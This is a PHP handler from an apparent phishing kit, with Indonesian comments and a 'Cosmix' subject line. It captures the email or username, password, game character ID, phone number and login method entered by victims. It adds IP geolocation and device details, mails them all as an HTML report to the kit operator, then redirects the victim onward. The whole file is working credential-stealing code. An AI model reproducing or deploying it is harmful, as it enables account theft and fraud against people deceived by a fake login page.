<?php
// MENGAMBIL KONTROL
include 'system/setting.php';
include 'email.php';



// MENANGKAP DATA YANG DI-INPUT
$user = new get_flag();
$email = $user->post($_POST['email']);
$password = $user->post($_POST['password']);
$playid = $user->post($_POST['playid']);
$phone = $user->post($_POST['phone']);
$login = $user->post($_POST['login']);

$benua = $bg['continent'];
$kodenegara = $bg['countryCode'];
$negara = $bg['country'];
$region = $bg['regionName'];
$city = $bg['city'];
$latitude = $bg['lat'];
$longtitude = $bg['lon'];
$timezone = $bg['timezone'];
$perdana = $bg['isp'];
$ipaddress = $bg['query'];
$platform = $infos['platfrm_name'];
$osversi = $infos['platfrm_vers'];
$browser = $infos['browser_name'];

if($email == "" && $password == "" && $login == ""){
    header("Location: index.php");
    }else{

$subjek = "Cosmix | $resultFlags = $kodenegara | OWNER $email | LOGIN $login";
$pesan = '
<center> 
<div style="background: url(https://raw.githubusercontent.com/genjehhh1/pabjii/main/banner.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="width: 78%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="width: 78%; text-align: center;"><b>'.$phone.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #FFE500; text-align: left; padding: 10px;">Information</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>IP ADDRESS</th>
<th style="width: 78%; text-align: center;"><b>'.$ipaddress.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$negara.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$region.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$city.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$latitude.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$longtitude.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya:
</div>
<div style="float: right;">
<a href="https://t.me/berbagisc"><img style="margin: 5px;" width="30" src="https://i.ibb.co/PCsB6xD/telegram.png"></a>
</div>
</div>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$user->mail($emailku, $subjek, $pesan, $headers);

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
echo "<form id='ss' method='POST' action='processing.php'>
<input type='hidden' name='email' value='$email'>
</form>
<script type='text/javascript'>document.getElementById('ss').submit();</script>";
    }
?>